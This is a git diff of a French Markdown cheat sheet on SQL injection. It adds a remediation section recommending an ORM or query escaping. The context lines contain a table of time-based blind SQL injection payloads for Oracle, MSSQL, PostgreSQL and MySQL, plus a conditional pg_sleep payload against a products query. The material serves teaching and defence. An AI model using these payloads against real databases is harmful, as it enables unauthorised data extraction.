@@ -1,7 +1,6 @@
 # Introduction
 
 Les injections SQL consistent à détourner la payload traditionnelle d'SQL pour y injecter du code SQL. On liste différents SGBD qui auront chacun sa syntaxe.
-
 ```sql
 select *
 from ma_table
@@ -312,3 +311,6 @@ select * from products where category = '' and (select case when (cond) then pg_
 | ------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
 | dbms_pipe.receive_message('a', x)                                                                            | waitfor delay '0:0:x'                                                                           | pg_sleep(x)                                                                          | sleep(x)                                                   |
 | 1=(select case when<br>(cond) then<br>'a' \|\| dbms_pipe.receive_message('a', 5)<br>else null end from dual) | 1=(select case when<br>(cond) then (select<br>1 where 1=1 waitfor delay '0:0:5')<br>else 1 end) | (select case when (cond)<br>then pg_sleep(x) else<br>pg_sleep(0) end) is not<br>null | 1=(select case when<br>(cond) then sleep(5)<br>else 0 end) |
+# Résolution
+
+Utiliser un ORM (Laravel-Eloquent) ou des librairies permettant d'échapper **chaque requête**.
